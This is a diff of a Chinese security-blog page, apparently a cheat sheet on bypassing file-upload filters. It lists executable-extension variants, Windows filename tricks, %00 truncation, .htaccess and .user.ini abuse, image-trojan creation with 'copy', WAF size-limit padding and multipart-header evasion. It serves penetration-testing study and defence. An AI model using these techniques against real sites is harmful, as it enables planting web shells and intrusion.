@@ -11,7 +11,7 @@
   <meta itemprop="name" content="文件上传-bypass">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="404">
+  <meta itemprop="wordCount" content="376">
   <meta itemprop="keywords" content="OWASP,文件上传"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="文件上传-bypass">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/114\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 文件上传","wordcount":  404 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 文件上传","wordcount":  376 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/114\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>文件上传-Bypass</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="404 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="376 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,9 +152,44 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#黑名单">黑名单</a>
       <ul>
-        <li></li>
+        <li><a href="#可解析后缀">可解析后缀</a></li>
+        <li><a href="#利用系统特性">利用系统特性</a></li>
+      </ul>
+    </li>
+    <li><a href="#白名单">白名单</a>
+      <ul>
+        <li><a href="#截断">截断</a></li>
+        <li><a href="#解析漏洞">解析漏洞</a></li>
+        <li><a href="#包含">包含</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#文件头">文件头</a></li>
+    <li><a href="#图片马">图片马</a></li>
+    <li><a href="#waf">WAF</a></li>
+    <li><a href="#二次渲染">二次渲染</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#条件竞争">条件竞争</a></li>
+    <li><a href="#绕waf">绕WAF</a>
+      <ul>
+        <li><a href="#多个filename">多个filename</a></li>
+        <li><a href="#交换name和filename的顺序">交换name和filename的顺序</a></li>
+        <li><a href="#去掉引号双引号变成单引号">去掉引号,双引号变成单引号</a></li>
+        <li><a href="#大小写">大小写</a></li>
+        <li><a href="#空格">空格</a></li>
+        <li><a href="#去掉或修改content-disposition值">去掉或修改Content-Disposition值</a></li>
+        <li><a href="#多个boundary">多个boundary</a></li>
+        <li><a href="#多个分号">多个分号</a></li>
+        <li><a href="#header在boundary前添加任意字符">Header在boundary前添加任意字符</a></li>
+        <li><a href="#filename换行">filename换行</a></li>
+        <li><a href="#name和filename添加任意字符串">name和filename添加任意字符串</a></li>
+        <li><a href="#postget">POST/GET</a></li>
       </ul>
     </li>
   </ul>
@@ -185,22 +220,28 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">audio</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">mp3：mp3文件</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">ms</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">wmv：wmv文件</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">mpeg4：mp4文件</span>
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">avi：avi文件</span></span></span></code></pre></div><h5 id="后缀校验" class="heading-element"><span>0.0.0.1  后缀校验</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">avi：avi文件</span></span></span></code></pre></div><h1 id="后缀校验" class="heading-element"><span>后缀校验</span>
   <a href="#%e5%90%8e%e7%bc%80%e6%a0%a1%e9%aa%8c" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="黑名单" class="heading-element"><span>0.0.0.1.1  黑名单</span>
+</h1><h2 id="黑名单" class="heading-element"><span>黑名单</span>
   <a href="#%e9%bb%91%e5%90%8d%e5%8d%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 可解析后缀</p>
-<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp" alt="image-20240221134159852" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=large 2x" data-title="image-20240221134159852" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</h2><h3 id="可解析后缀" class="heading-element"><span>可解析后缀</span>
+  <a href="#%e5%8f%af%e8%a7%a3%e6%9e%90%e5%90%8e%e7%bc%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp" alt="image-20240221134159852" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=large 2x" data-title="image-20240221134159852" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">php</span><span style="color:#ff636f">:</span>  <span style="color:#58a1dd">Php</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php2</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php3</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php4</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php5</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php6</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php7</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">pht</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">phtm</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">phtml</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">asp</span><span style="color:#ff636f">:</span>  <span style="color:#58a1dd">asp、aspx、asa、asax、ascx、ashx、asmx、cer</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">jsp</span><span style="color:#ff636f">:</span>  <span style="color:#58a1dd">jsp、jspa、jspx、jsw、jsv、jspf、jhtml</span></span></span></code></pre></div><p>fuzz工具：https://github.com/c0ny1/upload-fuzz-dic-builder</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">python2</span> <span style="color:#58a1dd">upload</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">fuzz</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">dic</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">builder</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">py</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#58a1dd">test</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">a</span> <span style="color:#58a1dd">jpg</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">l</span> <span style="color:#58a1dd">php</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">m</span> <span style="color:#58a1dd">apache</span> <span style="color:#ff636f">--</span><span style="color:#58a1dd">os</span> <span style="color:#58a1dd">win</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">o</span> <span style="color:#58a1dd">upload_file</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">txt</span></span></span></code></pre></div><!-- raw HTML omitted -->
-<p>####### 利用系统特性</p>
-<p>貌似主要是windows,常见的：1、大小写 2、点绕过（<code>.</code> 或者 <code>.空格.</code>） 3、空格绕过  4、::$DATA绕过</p>
+<h3 id="利用系统特性" class="heading-element"><span>利用系统特性</span>
+  <a href="#%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e7%89%b9%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>貌似主要是windows,常见的：1、大小写 2、点绕过（<code>.</code> 或者 <code>.空格.</code>） 3、空格绕过  4、::$DATA绕过</p>
 <p>Windows 下文件名结尾加入<code>&lt;</code>、<code>&gt;</code>、<code>&gt;&gt;&gt;</code>、<code>_</code>、<code>0x81-0xff</code>等字符，最终生成的文件均被 windows 忽略。</p>
 <pre tabindex="0"><code>shell.pHp
 shell.php. 
@@ -235,16 +276,22 @@ asa,cer,cdx,ashx,asmx,xml,htr,asax
 test.asp.jpg
 RTLO：
 asp.html-内容为一句话
-php.txt-内容为一句话</code></pre><h6 id="白名单" class="heading-element"><span>0.0.0.1.2  白名单</span>
+php.txt-内容为一句话</code></pre><h2 id="白名单" class="heading-element"><span>白名单</span>
   <a href="#%e7%99%bd%e5%90%8d%e5%8d%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 截断</p>
-<p>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断</p>
+</h2><h3 id="截断" class="heading-element"><span>截断</span>
+  <a href="#%e6%88%aa%e6%96%ad" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断</p>
 <p>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</p>
 <pre tabindex="0"><code>1.直接加%00 如 1.php%00
-2.二进制x00  去bp16进制里改00</code></pre><p>####### 解析漏洞</p>
-<blockquote>
+2.二进制x00  去bp16进制里改00</code></pre><h3 id="解析漏洞" class="heading-element"><span>解析漏洞</span>
+  <a href="#%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
 <p><strong>一、重写解析规则</strong></p>
 </blockquote>
 <p><a href="https://www.freebuf.com/articles/web/287193.html"target="_blank" rel="external nofollow noopener noreferrer">浅析.htaccess和.user.ini文件上传</a></p>
@@ -294,38 +341,41 @@ tomcat
 用于上传绕过的有三种，部分限制在 windows 操作系统下。
 1. xxx.jsp/
 2. xxx.jsp%20
-3. xxx.jsp::$DATA</code></pre><p>####### 包含</p>
-<p>传个图片然后包含</p>
-<h5 id="内容" class="heading-element"><span>0.0.0.2  内容</span>
+3. xxx.jsp::$DATA</code></pre><h3 id="包含" class="heading-element"><span>包含</span>
+  <a href="#%e5%8c%85%e5%90%ab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>传个图片然后包含</p>
+<h1 id="内容" class="heading-element"><span>内容</span>
   <a href="#%e5%86%85%e5%ae%b9" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="文件头" class="heading-element"><span>0.0.0.2.1  文件头</span>
+</h1><h2 id="文件头" class="heading-element"><span>文件头</span>
   <a href="#%e6%96%87%e4%bb%b6%e5%a4%b4" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>文件内容带上二进制文件头</p>
+</h2><p>文件内容带上二进制文件头</p>
 <pre tabindex="0"><code> GIF：47 49 46 38 39 61 
  png：89 50 4E 47 0D 0A 1A 0A 
- JPG：FF D8 FF E0 00 10 4A 46 49 46</code></pre><h6 id="图片马" class="heading-element"><span>0.0.0.2.2  图片马</span>
+ JPG：FF D8 FF E0 00 10 4A 46 49 46</code></pre><h2 id="图片马" class="heading-element"><span>图片马</span>
   <a href="#%e5%9b%be%e7%89%87%e9%a9%ac" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>如果用getimagesize、php_exif判断上传图片类型，直接传图片马就可以绕过</p>
+</h2><p>如果用getimagesize、php_exif判断上传图片类型，直接传图片马就可以绕过</p>
 <p>一般解析图片马需要结合<code>解析漏洞</code>或者<code>文件包含</code>才能解析图片马</p>
 <pre tabindex="0"><code>copy a.png /b + a.php /a 3.php  
 /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件
-/a:指定以ascii格式复制、合并文件用于txt等文本类文件</code></pre><h6 id="waf" class="heading-element"><span>0.0.0.2.3  WAF</span>
+/a:指定以ascii格式复制、合并文件用于txt等文本类文件</code></pre><h2 id="waf" class="heading-element"><span>WAF</span>
   <a href="#waf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p>
+</h2><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p>
 <p>构造一个大文件，前面1M的内容为==垃圾内容==，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验</p>
-<h6 id="二次渲染" class="heading-element"><span>0.0.0.2.4  二次渲染</span>
+<h2 id="二次渲染" class="heading-element"><span>二次渲染</span>
   <a href="#%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的<code>imagecreatefromjpeg()</code>等函数），所以普通的图片马都难逃被渲染的悲剧。</p>
 <p>经常是白名单+二次渲染的情况下，我们二次渲染传入图片马再找包含或者解析漏洞。</p>
 <p><a href="https://www.cnblogs.com/1ink/p/15115240.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/1ink/p/15115240.html</a></p>
@@ -348,23 +398,23 @@ tomcat
 <li><a href="https://xz.aliyun.com/t/2657#toc-12"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/2657#toc-12</a></li>
 <li><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/"target="_blank" rel="external nofollow noopener noreferrer">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></li>
 </ul>
